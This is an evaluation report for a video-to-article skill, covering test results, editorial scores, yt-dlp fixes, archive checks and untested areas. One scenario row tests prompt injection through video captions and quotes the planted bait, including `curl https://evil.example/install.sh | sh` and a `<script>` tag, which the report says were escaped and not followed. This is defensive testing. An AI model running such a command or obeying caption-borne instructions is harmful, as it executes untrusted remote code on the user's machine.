# distilling-videos: Task 5 evaluation

Date: 2026-10-19. Skill under test: `skills/distilling-videos` at commit `fa72b59`, then rerun
(without the network probe) after the review fixes described in "Review fixes and rerun" below.
Fixtures and harness: `evals/distilling-videos/` (see its `README.md` and `rubric.md`).

This evaluation does not show the task is complete. Still open: a transcription adapter and
provider selection (no accuracy has been measured), and the producer workflow that the GitHub
Actions archive hand-off needs.

## What this evaluation is, and is not

- It **is** an end-to-end skill evaluation. The real CLI (`distill.py`) ran with real `ffmpeg`
  and `ffprobe` on generated slide videos, with fixture transcripts and evaluator-composed
  articles. The output was checked against known ground truth, and real Chrome produced the
  PDFs and checked the pages.
- It is **not** a transcription or translation benchmark. The synthetic videos carry a sine tone
  instead of speech, and the fixture transcripts are ground truth by construction. **No accuracy
  score exists for audio transcription, captions, or translation**, and none is claimed. The paid
  provider benchmark in `reference/evaluations.md` is still not run, because there is no approved
  spending cap.
- Archive and cleanup used an in-process fake Blob transport with a placeholder SAS. Live Azure is
  still unverified.
- **Editorial scores are mostly self-assessed.** I, the evaluator, wrote the three articles from
  the fixtures by following `SKILL.md` and `reference/editorial.md`, and then scored them. An
  independent reviewer later read the tech-demo article and scored it **4/5 for fidelity and 4/5
  for separation**, lower than my self-assessed 5s (see the scores section). The tech-demo fixture
  was corrected afterwards, but the corrected version has not been re-scored by anyone
  independent. The other scores remain self-assessed; the machine checks and the 10 negative
  controls reduce, but do not remove, the effect of self-grading.

## Commands

```sh
# Scratch tools (reversible: delete .amp/in/venv and .amp/in/tools)
/opt/homebrew/bin/python3.14 -m venv .amp/in/venv
.amp/in/venv/bin/pip install 'yt-dlp[default]' static-ffmpeg     # static-ffmpeg fetches ffmpeg/ffprobe 7.0 (darwin arm64)
.amp/in/venv/bin/static_ffmpeg_paths
mkdir -p .amp/in/tools/bin   # symlinks to ffmpeg, ffprobe, yt-dlp

python3 evals/distilling-videos/run_eval.py --tools-bin .amp/in/tools/bin \
  --browser "/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary" \
  --capture --live-youtube https://youtu.be/G3VbsTdgLWE --live-timeout 180 \
  --live-captions-json3 .amp/in/probe/caps/G3VbsTdgLWE.en.json3
```

The runtime used Python 3.9.6 (`/usr/bin/python3`), yt-dlp 2026.08.19, ffmpeg 7.0 (static build),
Chrome Canary, and Node 26.12. The run took 65 s and exited 0. PDF pages were rasterized for
inspection with PyMuPDF in the scratch venv. That tool is not part of the harness.

## Results (per category)

The table below is the post-fix rerun without `--live-youtube`. The live-probe rows come from the
original run and were not repeated, to avoid unnecessary network calls.

| Category | Pass | Fail | Not run | Observed |
| --- | --- | --- | --- | --- |
| contracts (assignment limits, grouping, IDs, URLs, budgets shape) | 13 | 0 | 0 | 0 |
| evidence (missing tool, download, frames, transcript import, selection, coverage, resume) | 65 | 0 | 0 | 1 |
| budget (reserve, per-video and batch exhaustion, release, overrun, no-budget refusal) | 13 | 0 | 0 | 0 |
| publication (render refusals, offline/CSP, injection escaping, real PDF, package, determinism) | 52 | 0 | 0 | 3 |
| editorial (machine rubric) | 52 | 0 | 0 | 0 |
| editorial rubric negative controls | 10 | 0 | 0 | 0 |
| sign-off (blocking reasons, approval, provider kind recorded) | 8 | 0 | 0 | 0 |
| archive and cleanup (fake Blob) | 35 | 0 | 0 | 0 |
| rendered pages (real browser) | 39 | 0 | 0 | 0 |
| live YouTube probe (original run only) | 0 | 0 | 0 | 6 |

Observed rows are measurements, not pass/fail: scene cues found, PDF page counts, and live probe
results. Full rows: `.amp/in/artifacts/distilling-videos-eval/results.json` and `run.log`.

Publications produced:

| Publication | Manifest SHA-256 | Sign-off | Archive (fake) | Cleanup |
| --- | --- | --- | --- | --- |
| tech-demo | `a2d95641…b339b0` | approved | approved, verified | media deleted; evidence kept; render still works |
| g-bio (bio-a + bio-b) | `55da27bd…b47e59e` | approved | approved, 2 evidence markers | both members' media deleted, other media untouched |
| ja-talk | `fdd085a3…49dd23` | blocked (deliberate: visual coverage unverified) | archived as `blocked` | refused, media intact |

Manifest digests are from the post-fix rerun; they changed because the renderer, the tech-demo
article, and its figure changed.

The retention workspace (`retain_media: true`) archived ja-talk with an approved sign-off. Cleanup
then returned `retained` and deleted nothing.

## Mapping to the skill's evaluation scenarios

| Scenario (`reference/evaluations.md`) | Outcome |
| --- | --- |
| Technical demo | Dense 2 s frames plus cue frames over 10–40 s. Selected input, action, and output frames and the blurred latency frame. The sequence figure is in time order with no talking heads. The blurred p99 stays unknown in the article, brief, and limitations. The screen (12 OK / 38 × 429) contradicts the narration ("only the burst of ten"), and the article reports the contradiction. **Pass** |
| Japanese source | Verbatim Japanese `text`, `english_kind: translation`, and `english_label: translation`. 定石 is kept with its reading. Import rejects English labeled `clean`, unknown fields, out-of-order segments, and empty English. The PDF renders Japanese glyphs. **Pass** (translation *accuracy* not measured) |
| Biology claim with weak evidence | The presenter's "it will work for you" appears only as an attributed quote. The article and brief state that no study measured human lifespan, citing Colman 2009. **Pass** |
| Conflicting multi-video synthesis | The Wisconsin (bio-a s2) and NIA (bio-b s2) results are cited side by side with primary papers. Both members are cited. Repetition is called "not independent". A render that drops bio-b is refused. **Pass** |
| Malicious instructions in captions | Spoken and on-screen bait ("formally verified", `curl https://evil.example/install.sh \| sh`, `<script>`) is never followed, linked, or rendered as markup. It is escaped in Markdown, HTML, and the PDF. No remote requests occurred in the browser. **Pass** |
| Missing tool | `download` without ffmpeg/ffprobe exits 3, names the tool, and records the stage as `failed`. `validate --require-complete` fails. Rerunning with the tools resumes. **Pass** |
| Exhausted budget | Per-video and batch reservations over the cap exit 4, refused attempts are not recorded, an overrun is flagged by `validate`, and reserving without budgets exits 4. **Pass** |
| Interrupted archive | Failures at the final publication marker, at the first evidence marker, on a corrupted read-back, and on a transport error all exit 5 with no completion marker and no receipt. Cleanup is refused. A rerun creates a new attempt prefix. Errors never contain the SAS. **Pass** |
| No transcript route | Not exercised as agent dialogue. The harness supplies transcripts, and the live probe exercises the captions route. **Not run** |

Other archive negatives that passed: cleanup before archive, a SAS with delete permission, a missing
SAS, an `http://` container, a non-Azure host, a receipt for another container, evidence edited after
sign-off, and a remote object tampered after archive (`verify-archive` exits 1 and cleanup refuses).
Sign-off blocks an unjustified gap, an unreviewed uncertain segment, and unverified coverage, and it
rejects a gap entry that does not match `coverage.json` (exit 2).

## Editorial exercise and judgment scores

I wrote the articles in `evals/distilling-videos/fixtures/articles/` from the transcripts, the
frames I inspected, and primary sources I checked on 2026-10-19:

- Colman 2009 (doi:10.1126/science.1173635)
- Mattison 2012 (doi:10.1038/nature11432)
- Mattison 2017 (doi:10.1038/ncomms14063)
- the NIA research highlight on the 2017 paper
- the Kubernetes probes documentation
- RFC 6585

Crossref confirmed the DOI metadata. Each article sets out the four basis kinds and uses one
original SVG figure where it helps.

Scores marked *(independent)* come from the independent reviewer. All others are self-assessed.

| Publication | Fidelity | Uncertainty | Traceability | Separation | Explanation | Accessibility |
| --- | --- | --- | --- | --- | --- | --- |
| tech-demo | **4 (independent)**: the article called the configured burst "a floor" on what a spike lets through. It is not: burst + rate × duration is an upper bound that holds only if the bucket starts full. (My earlier self-score was 5.) | 5: p99 is unknown in prose, figure, brief, and limits | 4: the config citation chip shows the segment start (0:09) while the matching frame is at 0:12 | **4 (independent)**: the body labeled refill as "our inference", but the dek and the figure caption stated it as fact, and P2 was unconditional. (My earlier self-score was 5.) | 4: honest hook and arithmetic, but the recommendations rest on one synthetic run | 4: adjacent assumption superscripts read as "¹⁴" (fixed: now one "1, 4" marker); the zoom barely enlarges |
| ja-talk | 4: the etymology of 定石 (from Go) is my own knowledge and is not cited | 5 | 5 | 4: the uncited etymology mixes my knowledge into the source account | 4: clear but thin; it is a 30 s source | 4: the Japanese quote has no inline translation; the translation is in the preceding sentence |
| g-bio | 5: survival figures and the four design factors match the primary papers | 5: the unlabeled chart and the unclear years are kept, and the year is dated from the paper, not the presenter | 5 | 5 | 4: strong conflict hook; the design table is qualitative only | 4: same superscript issue in figure assumptions |

**Corrections after the independent review (fixture only; not re-scored):** the implications now
say the burst is not a cap on a whole spike and that burst + rate × duration is an upper bound
assuming a full bucket. The dek, section heading, figure caption, alt text, SVG labels, and
assumptions all label refill as our inference and state the full-bucket assumption. P2 is
conditional on P1 confirming refill, and its risks name the unconfirmed inference. The final
screenshots and PDF pages in the artifacts directory show the corrected article.

Visual inspection with `view_media` covered desktop and mobile tops, full pages, the stepper at its
last step, mobile stepper, expanded details, the zoom dialog, keyboard focus, the brief, print
emulation, and rasterized PDF pages. Nothing overlapped, was clipped, or failed to load. Two
problems were mine and are fixed in the fixtures: a source frame whose command line ran past 960
px, and a mobile element capture that clipped the left edge of a full-bleed figure.

## Live YouTube probe: G3VbsTdgLWE

No paid calls were made, and nothing was scored for accuracy.

| Step | What happened |
| --- | --- |
| Metadata (`yt-dlp --dump-single-json`) | Worked in about 3 s every time. Title "How Veritasium Storytelling Beat the YouTube Algorithm", uploader Storytellerist, 244 s, public, 177 automatic caption languages, no manual captions |
| CLI `download` (default) | **First attempt: exit 5, `HTTP Error 403: Forbidden`.** yt-dlp warned that no supported JavaScript runtime was found (only deno is enabled by default). With `--js-runtimes node` in a yt-dlp user config under a scratch `XDG_CONFIG_HOME`, the same CLI command downloaded 1080p media and audio in 9 s. Four later default runs also succeeded (about 9 s each). The 403 is therefore intermittent, and it was not evidence that the video was missing. That config-file workaround no longer applies: the CLI now passes `--ignore-config`, and the runtime is chosen with `download --js-runtime node`. The probe was not rerun with the new flag |
| CLI `frames` | Real ffmpeg. In the manual probe, 15 s periodic sampling plus a dense range and scene detection (threshold 0.3) on the 1080p video produced 79 frames in 87 s, with 57 scene cues. In the harness, 30 s periodic sampling produced 9 frames in 2.6 s |
| Automatic captions (json3) | Worked in 5 s at first. Later attempts hit **HTTP 429 Too Many Requests**, with a yt-dlp warning that no impersonation target was available. The final run worked again |
| Captions route import | 182 segments, 229.4 of 244.2 s covered, 1 gap, warning "captions-based transcript: accuracy and completeness are not verified". The segments were not compared with the audio |

## Findings from the original run

Findings 1–3 are fixed (see "Review fixes and rerun"). Findings 4–7 are unchanged.

1. **Contract and code mismatch (fixed in the docs).** `reference/article-contract.md` says "Every figure needs … an
   `alt`", but `publication.py` rejects a figure-level `alt` on `sequence` figures, which take
   per-step `alt` only. Fix one of them.
2. **Ambiguous superscripts (fixed).** Figure assumption citations render as adjacent `<sup>` elements with
   no separator, so citations 1 and 4 read as "¹⁴" (seen in the tech-demo zoom capture). Body
   citations use a comma.
3. **YouTube JavaScript runtime (fixed).** yt-dlp now expects a JS runtime (deno by default). `bootstrap.sh`
   neither checks for one nor mentions it, and the CLI cannot pass `--js-runtimes`. A documented
   yt-dlp config file is a workaround. Consider having bootstrap report deno or node, or mentioning
   the config in `SKILL.md`. Caption fetches can also be rate-limited (429) after repeated use.
4. **Scene detection.** On slide changes between dark terminal frames, `--scene-threshold 0.3` found
   1 cue out of 6 cuts. Periodic, dense, and cue sampling still covered the demo. This supports the
   skill's warning that scene cuts alone miss edits.
5. **Citation chip time.** When a citation combines `segment_ids` and `frame_id`, the chip and link
   use the segment start, not the frame time (0:09 instead of 0:12). It is defensible, but readers
   may expect the frame moment.
6. **Small UX points.** `--from-file` sources show "unknown creator" in the masthead. The zoom
   dialog shows the SVG at about its inline size.
7. **Environment.** This Mac had no ffmpeg on `PATH`, `/opt/homebrew/bin`, or `/usr/local/bin`.
   The static pip build was enough for the evaluation, but `brew install ffmpeg` is still the
   documented route.

## Review fixes and rerun

The independent review raised these points. Each code change was made test-first.

| Finding | Change | Contract change |
| --- | --- | --- |
| Sign-off ignored transcript provenance | `signoff` records `transcript_provider` (`name`, `kind`, and `model`/`version` when present) for each video. For `captions` and `agent` transcripts it blocks without `audio_verification`, which lists the spans checked against the source audio (`method`, `checks[]` with `start`, `end`, `segment_ids`, `result` of `matches` or `differs`, and `note`). A `differs` result also blocks. `cleanup` refuses media release when the sign-off's provider does not match `segments.json`, or when a captions or agent transcript lacks passing checks. The record holds `checked_seconds`, `checked_fraction`, and a `limits` statement. There is no "accurate" flag | `reference/archival.md`: review and `signoff.json` shape; cleanup binding step 5 |
| Optional article fields could cause tracebacks | Wrong types in `risks`, `question`, quote `cite`, `segment_ids`, `frame_id`, figure `sources`, evidence `citations`, proposal `basis`, list `ordered`, `partial_reason`, `audience`, and web-citation text fields are now contract errors (exit 2) | `reference/article-contract.md`: optional field types |
| `sequence` alt documented as figure-level | Docs now say alt is per step. A figure-level `alt` on a sequence is rejected (regression test) | `reference/article-contract.md`: Figures |
| Adjacent superscripts ("¹⁴") | Figure-assumption and brief-evidence sources render as one marker. Numbers inside a marker are separated by a literal ", " in the HTML, replacing the CSS `::before` comma | Rendering only |
| yt-dlp runtime and config | `download --js-runtime deno\|node\|quickjs [--js-runtime-path ABS]` is checked against upstream ([EJS guide](https://github.com/yt-dlp/yt-dlp/wiki/EJS), README `--js-runtimes`/`--ignore-config`). Bun is excluded because it is deprecated and runs scripts without permission restrictions. The runtime is resolved to an absolute path and passed as `--no-js-runtimes --js-runtimes NAME:PATH`. It is part of the reuse config and is recorded in `source.json` with its version. yt-dlp always runs with `--ignore-config`, with no `--remote-components`: yt-dlp does not vendor the EJS solver scripts in its PyPI package, so `bootstrap.sh` installs `yt-dlp[default]`, whose `default` extra supplies them through the `yt-dlp-ejs` package (upstream EJS guide, step 2), repairs a venv that lacks `yt_dlp_ejs`, and reports it as missing under `--check`. `--no-warnings` was dropped: `WARNING:` lines are kept in the output and in `source.json` `warnings`. `--timeout` (default 1800 s, max 21600 s) bounds yt-dlp and ffmpeg, and on timeout the process group is killed. `bootstrap.sh` reports deno (≥ 2.3.0), node (≥ 22), or quickjs and which flag to use | `reference/contracts.md`: download CLI, reuse config, `source.json` fields |
| Status claims | README and SKILL now state what was actually tested and what was not | — |
| Unhashable required article fields crashed `render` | A list or object in block `figure`, evidence `kind`/`basis`/`id`, proposal `kind`/`id`, or citation `video_id` raised `TypeError` before membership checks. These are now type-checked first and exit 2 with a `ContractError` (regression cases for list and object values). Quote and coverage lookups on `video_id` are guarded the same way | `reference/article-contract.md` unchanged (types were already required) |
| Bare `pip install yt-dlp` lacks the EJS solver | `bootstrap.sh` installs and upgrades `yt-dlp[default]`, whose extra supplies `yt-dlp-ejs` (upstream EJS guide step 2 and yt-dlp `pyproject.toml`). An existing venv without `yt_dlp_ejs` is repaired on a normal run; `--check` reports it missing (exit 3). Tested with a fake venv | `reference/contracts.md`: known limits |
| One spot check could release captions/agent media | Audio check `start`/`end` must be finite (NaN and Infinity rejected); `method` and `result` are type-checked. For `captions`/`agent` transcripts, sign-off is blocked unless the merged checked intervals cover every transcript segment; partial spot checks are recorded (`spoken_segments`, `unchecked_segment_ids`) for the report. `cleanup` recomputes coverage from the signed checks and current `segments.json` and refuses partial coverage. Coverage is not a measured accuracy rate | `reference/archival.md`: review, blockers, cleanup step 5 |
| tech-demo editorial | Fixture corrected as described above; scores updated with the independent results | — |

Verification commands and results:

```sh
python3 -m unittest discover -s tests -p 'test_*.py'      # Ran 98 tests, OK
make check                                                # exit 0: bun 4 pass; Python 98 tests OK; "All checks passed."
python3 evals/distilling-videos/run_eval.py --tools-bin .amp/in/tools/bin \
  --browser "/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary" --capture
# exit 0; 287 pass, 0 fail across 9 categories (table above); no network probe. After the residual
# fixes the rerun matched: report.json identical; six screenshots differed only by antialiasing noise
# (same dimensions, max channel delta 16/255, under 0.1% of pixels)
```

## Publication UX extension (2026-10-20)

Spec: `docs/superpowers/specs/2026-10-20-distilling-videos-publication-ux-design.md`. The renderer
now writes an offline site: `index.html` is an editorial cover and `article.html` is the article,
which `pdf` prints (`pdf.json` records `page` and `page_sha256`; an older `index_sha256` record is
stale). Every page has the collapsible navigation, Copy page, Download Markdown, and its embedded
Markdown twin. The package, manifest, ZIP, archive, and sign-off contracts are unchanged; the new
files are ordinary allowlisted `.html`, `.md`, `.js`, and `.css` files.

The harness was adjusted for the split: the publication category checks that every expected page
exists, that the cover and article are separate, that each page embeds exactly its `.md` twin, and
that every page is offline. `capture.mjs` was extended to the interactions listed in the eval
README. Commands and results (Chrome Canary, offline via a dead proxy):

```sh
make check   # exit 0: bun 4 pass; Python 111 tests OK; "All checks passed."
python3 evals/distilling-videos/run_eval.py --tools-bin .amp/in/tools/bin \
  --browser "/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary" --capture
# exit 0; 429 pass, 0 fail (publication 61, rendered pages 172: tech-demo 59, ja-talk 56, g-bio 56)
```

Observed in the real browser, per publication: no remote requests, console errors, or exceptions;
no horizontal overflow at 390 px on any page; desktop navigation collapse persists across pages;
the mobile menu traps Tab and returns focus; a citation opens the evidence panel (desktop) or
bottom sheet (mobile) with the URL and scroll position unchanged and focus returned on Escape;
Copy page wrote the exact Markdown twin to the real clipboard, fell back to `execCommand` when the
Clipboard API was denied, and selected the full text for manual copying when both were blocked;
filtered transcripts still copy the full Markdown; search found transcript text, including Japanese
original text, and its links landed on visible targets; the gallery viewer worked by buttons,
keys, zoom, pan, drag, and touch swipe; Dracula and four other themes applied and persisted, an
unknown saved theme and blocked storage fell back safely, system dark selected house dark, and
print used house light; with GSAP blocked or reduced motion requested, nothing animated and every
section stayed visible; print emulation and the real PDFs (6, 4, and 7 pages) contain the article
only, with every sequence step and expanded explanation and no navigation or toolbar text; without
JavaScript every page showed navigation, steps, the Markdown, and the download link, and citations
were ordinary links to references.

Limits of this evidence: one browser engine (Chrome Canary on macOS); touch was emulated over
DevTools, not a physical device; theme contrast is computed for the seven tokens and their tinted
grounds, not for every pixel of every screenshot; screen readers were not run; the `execCommand`
fallback and manual-selection paths were forced by stubbing browser APIs.

## Not tested

- Accuracy of audio transcription, captions, or translation, and any provider. No reference audio
  transcripts and no paid calls.
- Live Azure Blob, a real SAS, and the GitHub Actions hand-off (still blocked on a producer workflow).
- Agent dialogue behavior: editorial approval pause, asking for authorization, and the "no
  transcript route" explanation.
- An independent re-score of the corrected tech-demo article, and any independent review of
  ja-talk and g-bio.
- `download --js-runtime` against live YouTube (unit-tested with fake tools only), and the caption
  audio-verification gate on a real captions transcript.
- Linux or orb execution. Fonts and paths in `media.json` include Linux fallbacks, but they were not
  run.
- Long videos and batches near 10 videos with real media (limits were checked at assignment level
  only).

## Artifacts (ignored, under `.amp/in/artifacts/distilling-videos-eval/`)

These files are from the post-fix rerun, so they show the corrected tech-demo article. `results.json`
and `run.log` therefore have no live-probe rows; the live-probe observations above come from the
original run.

- `<pub>/desktop-top.png`, `desktop-full.png`, `mobile-top.png`, `mobile-full.png`,
  `desktop-stepper-last.png`, `mobile-stepper.png`, `desktop-details.png`, `desktop-zoom.png`,
  `desktop-keyboard-focus.png`, `print-full.png`, `brief-full.png`
- `<pub>/article.pdf`, `pdf-page-N.png`, `pdf-text.txt`, the packaged ZIP, and the source frames
  (blurred latency frame, unlabeled chart)
- `report.json` (browser checks), `results.json`, `summary.md`, `run.log`
